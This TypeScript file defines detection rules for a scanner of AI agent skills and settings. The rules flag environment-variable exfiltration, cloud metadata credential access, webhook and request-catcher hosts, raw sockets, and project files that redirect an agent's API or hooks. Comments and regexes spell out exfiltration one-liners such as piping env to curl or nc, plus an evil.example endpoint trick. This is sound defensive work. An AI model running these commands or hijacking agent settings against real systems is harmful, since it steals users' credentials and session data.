import type { Rule } from '../types.js';
import {
  AGENT_SETTINGS_FILENAMES,
  decodeJsonStrings,
  extractEnvHeaderHttpHookUrls,
  extractExternalHttpHookUrls,
} from './agent-config.js';
import {
  maskDocumentationExampleContext,
  maskDocumentationTextInCode,
  maskSecurityEducationExampleContext,
  maskShellCommentsAndSingleQuotedStrings,
} from './code-context.js';
import { maskProcessEnvReadsNotSent, PROCESS_ENV_TOKEN_SOURCE } from './js-env-flow.js';
import { markEnvironFlow, SENT_ENVIRON_READ_MARK } from './python-env-flow.js';

// Patterns are split to avoid triggering static-analysis hooks on this detector file itself.
// These rules detect env-exfil and network calls in scanned skills, not in this codebase.

// A shell line that only prints a quoted curl or wget command, such as a usage hint.
const nonExecutingShellOutputPattern =
  /^\s*(?:echo|printf|warn|warning|error|info|log|log_warning)\b\s+["'][^"'\n]*\b(?:curl|wget)\b[^"'\n]*https?:\/\/[^"'\n]*["']\s*$/i;

function maskLine(line: string): string {
  return ' '.repeat(line.length);
}

// NET-EXFIL-ENV: the whole environment (os.environ, process.env, env) sent over the network.
// The view marks each Python read of the whole environment that reaches a network call, and it
// keeps a JavaScript `process.env` token only where the whole object reaches one, so any mark or
// token in it is a hit.
const pyEnvironSentPattern = new RegExp(SENT_ENVIRON_READ_MARK);
const jsEnvSentPattern = new RegExp(PROCESS_ENV_TOKEN_SOURCE);

// Shell commands that print every variable. With an argument (`printenv PATH`) they print one
// value, so each pattern requires the dump to end at a `)`, a backtick, or a pipe.
const SHELL_ENV_DUMP =
  '(?:(?:\\/usr)?\\/bin\\/)?(?:env|printenv|export(?:\\s+-p)?|declare\\s+-[px]|set)';
// Text of one shell command: stops at a comment or a newline, but follows `\` continuations.
const SHELL_COMMAND_TEXT = '(?:[^#\\n]|\\\\\\r?\\n)';
// Text of one pipeline stage: also stops at `;`, `&`, and `|`.
const SHELL_PIPELINE_STAGE_TEXT = '(?:[^#;&|\\n]|\\\\\\r?\\n)';
// Short options can share one dash (`-sd`). The option that takes the value comes last.
const CURL_WGET_DATA_FLAG =
  '(?:-[A-Za-z]*[dF]|--data(?:-ascii|-binary|-raw|-urlencode)?|--form|--post-data|--body-data)';
// Text between a data flag and the dump: an optional unquoted field name or file marker
// (`env=`, `@`), then an optional double-quoted body up to the dump.
const DATA_VALUE_PREFIX = '[^\\s"\']{0,40}(?:"(?:[^"\\\\\\n]|\\\\.){0,200})?';
// $(env), `env`, or <(env), optionally piped through an encoder such as base64.
const ENV_DUMP_SUBSTITUTION = [
  '(?:\\$\\(|`|<\\()\\s*',
  SHELL_ENV_DUMP,
  '\\s*(?:\\|[^)`\\n]{0,80})?[)`]',
].join('');
// Network clients that send their stdin: curl with `@-` or an upload of `-`, wget with a stdin
// post file, and netcat, which sends stdin by default.
const STDIN_ARGUMENT = '(?:-|\\/dev\\/stdin)(?![\\w/.-])';
const CURL_STDIN_MARKER = '(?:@|\\s(?:-[A-Za-z]*T|--upload-file)\\s*)';
const CURL_SENDS_STDIN = [
  'curl\\b',
  SHELL_PIPELINE_STAGE_TEXT,
  '{0,200}',
  CURL_STDIN_MARKER,
  STDIN_ARGUMENT,
].join('');
const WGET_SENDS_STDIN = [
  'wget\\b',
  SHELL_PIPELINE_STAGE_TEXT,
  '{0,200}--(?:post|body)-file[=\\s]["\']?',
  STDIN_ARGUMENT,
].join('');
const NETCAT_COMMAND = '(?:nc|ncat|netcat)\\s';
const STDIN_NETWORK_CLIENT = `(?:${CURL_SENDS_STDIN}|${WGET_SENDS_STDIN}|${NETCAT_COMMAND})`;

// curl -d "$(env)" URL, curl --data @<(env) URL, wget --post-data="$(printenv)" URL
const shellEnvDumpDataPattern = new RegExp(
  [
    '\\b(?:curl|wget)\\b',
    SHELL_COMMAND_TEXT,
    '{0,200}\\s',
    CURL_WGET_DATA_FLAG,
    '(?:\\s+|=)?',
    DATA_VALUE_PREFIX,
    ENV_DUMP_SUBSTITUTION,
  ].join('')
);
// env | curl -d @- URL, printenv | base64 | curl --data-binary @- URL, env | nc HOST PORT
const shellEnvDumpPipePattern = new RegExp(
  [
    '(?<![\\w.$-])',
    SHELL_ENV_DUMP,
    '\\s*\\|(?!\\|)(?:',
    SHELL_PIPELINE_STAGE_TEXT,
    '{0,80}\\|){0,3}\\s*',
    STDIN_NETWORK_CLIENT,
  ].join('')
);
// curl --data-binary @- URL <<< "$(env)", nc HOST PORT < <(printenv). The redirect must be on the
// same command as the network client.
const shellEnvDumpRedirectPattern = new RegExp(
  [
    '\\b(?:curl|wget|nc|ncat|netcat)\\b',
    SHELL_PIPELINE_STAGE_TEXT,
    '{0,200}(?:<<<\\s*"?|<\\s*)',
    ENV_DUMP_SUBSTITUTION,
  ].join('')
);

// A single-quoted stdin argument ('@-') reaches the client unchanged, but the shell mask blanks
// single-quoted text. The quotes become trailing spaces, so finding offsets do not move.
const SINGLE_QUOTED_STDIN_ARGUMENT = /'(@?(?:-|\/dev\/stdin))'/g;
// A command substitution inside a printed string still runs, so its line stays visible. An odd
// number of backslashes before `$(` or a backtick escapes it, and the shell prints it as text.
const UNESCAPED_COMMAND_SUBSTITUTION = /(?<!\\)(?:\\\\)*(?:\$\(|`)/;

function maskNonExecutingEnvDumpText(content: string, filePath: string): string {
  return /\.(?:sh|bash)$/i.test(filePath)
    ? maskNonExecutingShellText(content)
    : maskDocumentationTextInCode(content, filePath);
}

/** The view of shell code: comments, single-quoted text, and lines that only print are masked. */
function maskNonExecutingShellText(script: string): string {
  const unquoted = script.replace(SINGLE_QUOTED_STDIN_ARGUMENT, '$1  ');
  return maskShellCommentsAndSingleQuotedStrings(unquoted)
    .split('\n')
    .map((line) =>
      nonExecutingShellOutputPattern.test(line) && !UNESCAPED_COMMAND_SUBSTITUTION.test(line)
        ? maskLine(line)
        : line
    )
    .join('\n');
}

const PYTHON_SCAN_PATH = /\.py$/i;

// The Python flow reads Python. In a Python file it may mark a read that the view masked, such
// as one in an f-string field, and it shows each string that a shell runs as shell code. In
// another language it marks only the reads that the language view kept: Python in a shell heredoc
// counts, a read in a `//` comment does not. The JavaScript flow reads only the view of a
// JavaScript or TypeScript file.
function prepareEnvExfilView(content: string, filePath: string): string {
  const view = maskNonExecutingEnvDumpText(content, filePath);
  const isPython = PYTHON_SCAN_PATH.test(filePath);
  const pythonView = markEnvironFlow(view, content, isPython ? maskNonExecutingShellText : undefined);
  return maskProcessEnvReadsNotSent(pythonView, content, filePath);
}

export const NET_EXFIL_ENV: Rule = {
  id: 'NET-EXFIL-ENV',
  category: 'network-exfil',
  severity: 'critical',
  appliesTo: ['*.py', '*.sh', '*.bash', '*.js', '*.ts', '*.mjs'],
  patterns: [
    pyEnvironSentPattern,
    jsEnvSentPattern,
    shellEnvDumpDataPattern,
    shellEnvDumpPipePattern,
    shellEnvDumpRedirectPattern,
  ],
  prepareContent: prepareEnvExfilView,
  message: 'Environment variables transmitted over outbound HTTP — credential exfiltration.',
  fix: 'Remove code that sends os.environ / process.env to external endpoints.',
  cwe: ['CWE-200'],
};

// NET-CLOUD-METADATA-CREDENTIALS: access to cloud credential metadata endpoints
const awsCredentialMetadataPath = [
  '169\\.254\\.169\\.254',
  '\\/latest\\/meta-data\\/iam\\/security-credentials',
].join('');
const gcpCredentialMetadataPath = [
  'metadata\\.google\\.internal',
  '\\/computeMetadata\\/v1\\/instance\\/service-accounts\\/[^\\s\'")]+\\/token',
].join('');
const azureIdentityMetadataPath = [
  '169\\.254\\.169\\.254',
  '\\/metadata\\/identity\\/oauth2\\/token',
].join('');
const ecsCredentialsEnvVar = [
  'AWS_CONTAINER_CREDENTIALS_RELATIVE_URI',
  'AWS_CONTAINER_CREDENTIALS_FULL_URI',
].join('|');
const credentialMetadataUrlPattern = [
  'https?:\\/\\/(?:',
  awsCredentialMetadataPath,
  '|',
  gcpCredentialMetadataPath,
  '|',
  azureIdentityMetadataPath,
  ')',
].join('');
const cloudMetadataClientPattern = new RegExp(
  ['\\b(?:requests|httpx)\\.\\w+\\s*\\([\\s\\S]{0,300}', credentialMetadataUrlPattern].join(''),
  'i'
);
const cloudMetadataFetchPattern = new RegExp(
  ['\\bfetch\\s*\\([\\s\\S]{0,300}', credentialMetadataUrlPattern].join(''),
  'i'
);
const cloudMetadataCurlPattern = new RegExp(
  ['\\b(?:curl|wget)\\b[\\s\\S]{0,300}', credentialMetadataUrlPattern].join(''),
  'i'
);
const ecsCredentialsEnvPattern = new RegExp(
  [
    '\\b(?:os\\.environ(?:\\.get)?\\s*\\(\\s*[\'"](?:',
    ecsCredentialsEnvVar,
    ')[\'"]|process\\.env(?:\\.(?:',
    ecsCredentialsEnvVar,
    ')|\\s*\\[\\s*[\'"](?:',
    ecsCredentialsEnvVar,
    ')[\'"]\\s*\\]))',
  ].join(''),
  'i'
);
const ecsCredentialEndpointPattern =
  /\b(?:requests|httpx)\.\w+\s*\([\s\S]{0,200}https?:\/\/169\.254\.170\.2\//i;

export const NET_CLOUD_METADATA_CREDENTIALS: Rule = {
  id: 'NET-CLOUD-METADATA-CREDENTIALS',
  category: 'network-exfil',
  severity: 'critical',
  appliesTo: ['*.py', '*.sh', '*.bash', '*.js', '*.ts', '*.mjs'],
  patterns: [
    cloudMetadataClientPattern,
    cloudMetadataFetchPattern,
    cloudMetadataCurlPattern,
    ecsCredentialsEnvPattern,
    ecsCredentialEndpointPattern,
  ],
  prepareContent: maskDocumentationExampleContext,
  message:
    'Cloud credential metadata endpoint access detected — may expose instance or container credentials.',
  fix: 'Remove requests to cloud metadata credential endpoints from skills.',
  cwe: ['CWE-200', 'CWE-918'],
};

// NET-OUTBOUND-NONLOCAL: hardcoded outbound HTTP to non-localhost addresses
const shellOutboundPattern =
  /\b(?:curl|wget)\s[^\n]{0,200}https?:\/\/(?!localhost|127\.0\.0\.1|::1)[a-zA-Z0-9]/;
const pyOutboundPattern =
  /\b(?:requests|httpx)\.\w+\s*\(\s*['"]https?:\/\/(?!localhost|127\.0\.0\.1|::1)[a-zA-Z0-9]/;
const jsOutboundPattern = /\bfetch\s*\(\s*['"]https?:\/\/(?!localhost|127\.0\.0\.1|::1)[a-zA-Z0-9]/;

function maskNonExecutingOutboundExamples(content: string, filePath: string): string {
  const shellPrepared = /\.(?:sh|bash)$/i.test(filePath)
    ? maskDocumentationTextInCode(content, filePath)
    : content;
  return maskDocumentationExampleContext(shellPrepared, filePath)
    .split('\n')
    .map((line) => (nonExecutingShellOutputPattern.test(line) ? maskLine(line) : line))
    .join('\n');
}

export const NET_OUTBOUND_NONLOCAL: Rule = {
  id: 'NET-OUTBOUND-NONLOCAL',
  category: 'network-exfil',
  severity: 'high',
  appliesTo: ['*.py', '*.sh', '*.bash', '*.js', '*.ts', '*.mjs'],
  patterns: [shellOutboundPattern, pyOutboundPattern, jsOutboundPattern],
  prepareContent: maskNonExecutingOutboundExamples,
  message: 'Hardcoded outbound HTTP call to non-localhost address detected.',
  fix: 'Audit the destination. Skills should not make arbitrary external HTTP calls.',
  cwe: ['CWE-918'],
};

// NET-WEBHOOK-KNOWN: chat webhooks, request catchers, and paste upload APIs.
// Request catcher patterns need a bin token in the subdomain or path, so docs can still link a
// service home page such as https://webhook.site or its docs and dashboard hosts. The token can be
// literal or come from a variable (`$BIN`, `${BIN}`, `{BIN}`) or string concatenation.
const CATCHER_SERVICE_SUBDOMAINS = '(?:www|docs|app)';
const TOKEN_SUBDOMAIN_CATCHER_HOSTS = [
  'webhook\\.site',
  'requestbin\\.(?:net|com)',
  '[mx]\\.pipedream\\.net',
  'requestcatcher\\.com',
  'beeceptor\\.com',
  // interactsh out-of-band interaction servers
  'interact\\.sh',
  'oast\\.(?:fun|live|me|online|pro|site)',
].join('|');
const TOKEN_PATH_CATCHER_HOSTS = [
  'webhook\\.site',
  'requestbin\\.(?:net|com)',
  'requestb\\.in',
  'hookb\\.in',
].join('|');
const tokenSubdomainCatcherPattern = new RegExp(
  [
    `https?:\\/\\/(?!${CATCHER_SERVICE_SUBDOMAINS}\\.)[\\w.{}$-]+`,
    `\\.(?:${TOKEN_SUBDOMAIN_CATCHER_HOSTS})(?![\\w.-])`,
  ].join(''),
  'i'
);
const tokenPathCatcherPattern = new RegExp(
  `https?:\\/\\/(?:${TOKEN_PATH_CATCHER_HOSTS})\\/(?:[\\w{$-]|["'\`]\\s*\\+)`,
  'i'
);
const pastebinUploadPattern = /https?:\/\/pastebin\.com\/api\/api_post\.php/i;

export const NET_WEBHOOK_KNOWN: Rule = {
  id: 'NET-WEBHOOK-KNOWN',
  category: 'network-exfil',
  severity: 'critical',
  appliesTo: ['*.py', '*.sh', '*.bash', '*.js', '*.ts', '*.mjs', '*.md'],
  patterns: [
    /https:\/\/discord\.com\/api\/webhooks\//,
    /https:\/\/hooks\.slack\.com\/services\//,
    /https:\/\/api\.telegram\.org\/bot[A-Za-z0-9_-]+\//,
    /https:\/\/ntfy\.sh\//,
    /https:\/\/discord\.com\/api\/channels\/[0-9]+\/messages/,
    tokenSubdomainCatcherPattern,
    tokenPathCatcherPattern,
    pastebinUploadPattern,
  ],
  prepareContent: maskSecurityEducationExampleContext,
  message:
    'Known webhook endpoint detected — data may be silently exfiltrated to an attacker-controlled channel.',
  fix: 'Remove or replace the webhook URL. Never hardcode exfiltration endpoints in skills.',
  cwe: ['CWE-200'],
};

// NET-RAW-SOCKET: raw socket creation in Python or Node.js
export const NET_RAW_SOCKET: Rule = {
  id: 'NET-RAW-SOCKET',
  category: 'network-exfil',
  severity: 'medium',
  appliesTo: ['*.py', '*.sh', '*.js', '*.ts', '*.mjs'],
  patterns: [
    /\bsocket\.socket\s*\(/,
    /\bsocket\s*\.\s*connect\s*\(\s*\(/,
    /\bnet\.createConnection\s*\(/,
    /\bnet\.connect\s*\(/,
  ],
  prepareContent: maskDocumentationExampleContext,
  message: 'Raw socket creation detected — may be used for covert C2 communication.',
  fix: 'Replace raw socket usage with a documented, auditable HTTP client library.',
  cwe: ['CWE-200'],
};

// NET-DNS-UNUSUAL-TLD: connections or DNS lookups targeting suspicious TLDs
const unusualTldUrlPattern =
  /https?:\/\/[a-zA-Z0-9.-]+\.(?:xyz|top|tk|ml|ga|cf|gq|pw|click|download|zip)\b/i;
const unusualTldDnsPattern =
  /(?:socket\.getaddrinfo|dns\.lookup|dns\.resolve)\s*\([^)]{0,100}\.(?:xyz|top|tk|ml|ga|cf|gq|pw|click|download|zip)\b/i;

export const NET_DNS_UNUSUAL_TLD: Rule = {
  id: 'NET-DNS-UNUSUAL-TLD',
  category: 'network-exfil',
  severity: 'medium',
  appliesTo: ['*.py', '*.sh', '*.bash', '*.js', '*.ts', '*.mjs', '*.md'],
  patterns: [unusualTldUrlPattern, unusualTldDnsPattern],
  prepareContent: maskDocumentationExampleContext,
  message: 'Network connection to a TLD commonly used for C2 infrastructure.',
  fix: 'Audit the destination domain. If legitimate, document the reason in a comment.',
  cwe: ['CWE-200'],
};

// NET-API-ENDPOINT-OVERRIDE: repository settings that point the agent's model API at another
// host. The agent then sends its API key and every prompt there (CVE-2026-21852), so this is
// critical. Only the providers' own API hosts count as official.
const apiEndpointEnvVar =
  '(?:ANTHROPIC_(?:BEDROCK_|BEDROCK_MANTLE_|VERTEX_|FOUNDRY_|AWS_)?BASE_URL|OPENAI_BASE_URL)';
const officialApiHost = [
  'api\\.anthropic\\.com',
  'bedrock-runtime(?:-fips)?\\.[a-z0-9-]+\\.amazonaws\\.com',
  '[a-z0-9.-]+\\.api\\.aws',
  '(?:[a-z0-9-]+-)?aiplatform\\.googleapis\\.com',
  '[a-z0-9-]+\\.services\\.ai\\.azure\\.com',
  'api\\.openai\\.com',
].join('|');
// Clients ignore leading whitespace in the URL. After an official host, only a port and then
// the path or the end of the value may follow, so `api.anthropic.com:443@evil.example` is flagged.
const apiEndpointOverridePattern = new RegExp(
  `"${apiEndpointEnvVar}"\\s*:\\s*"\\s*(?!https://(?:${officialApiHost})(?::\\d+)?["/])[^"\\s]`,
  'i'
);

export const NET_API_ENDPOINT_OVERRIDE: Rule = {
  id: 'NET-API-ENDPOINT-OVERRIDE',
  category: 'network-exfil',
  severity: 'critical',
  appliesTo: AGENT_SETTINGS_FILENAMES,
  appliesToScopes: ['project'],
  patterns: [apiEndpointOverridePattern],
  prepareContent: decodeJsonStrings,
  message:
    'Project settings redirect the model API - the agent sends its API key and prompts to a non-official endpoint.',
  fix: 'Remove the base URL override from repository settings. Set a gateway URL only in your own user settings.',
  cwe: ['CWE-200', 'CWE-522'],
};

// NET-HOOK-HTTP-EXTERNAL: repository hooks that post the hook input to a host other than this
// machine. The input holds the session ID, the transcript path, prompts, and tool input and
// output, so the repository author receives the session: high. A hook whose headers also expand
// environment variables sends the user's tokens and keys too: critical. The views keep only the
// URLs of those hooks, so any text in a view is a hit. The pattern does not look for `://`,
// because the URL parser also accepts spellings such as `https:evil.example/x`.
// ponytail: only Claude Code and Copilot CLI document HTTP hooks, but the rule matches by file
// name, so an HTTP hook in a Codex, Cursor, Gemini CLI, or Windsurf file is reported too. Hooks
// in skill or subagent frontmatter are not checked.
export const NET_HOOK_HTTP_EXTERNAL: Rule = {
  id: 'NET-HOOK-HTTP-EXTERNAL',
  category: 'network-exfil',
  severity: 'high',
  appliesTo: [...AGENT_SETTINGS_FILENAMES, 'hooks.json'],
  appliesToScopes: ['project'],
  patterns: [/\S+/],
  prepareContent: extractExternalHttpHookUrls,
  escalation: { severity: 'critical', prepareContent: extractEnvHeaderHttpHookUrls },
  message:
    'Project HTTP hook posts session data to an external host - the repository author receives prompts, tool input and output, and any environment variables in its headers.',
  fix: 'Remove the HTTP hook from repository settings or point it at a loopback address. Add hooks that send data off this machine only in your own user settings.',
  cwe: ['CWE-200', 'CWE-522'],
};

export const NETWORK_EXFIL_RULES: Rule[] = [
  NET_EXFIL_ENV,
  NET_CLOUD_METADATA_CREDENTIALS,
  NET_OUTBOUND_NONLOCAL,
  NET_WEBHOOK_KNOWN,
  NET_RAW_SOCKET,
  NET_DNS_UNUSUAL_TLD,
  NET_API_ENDPOINT_OVERRIDE,
  NET_HOOK_HTTP_EXTERNAL,
];
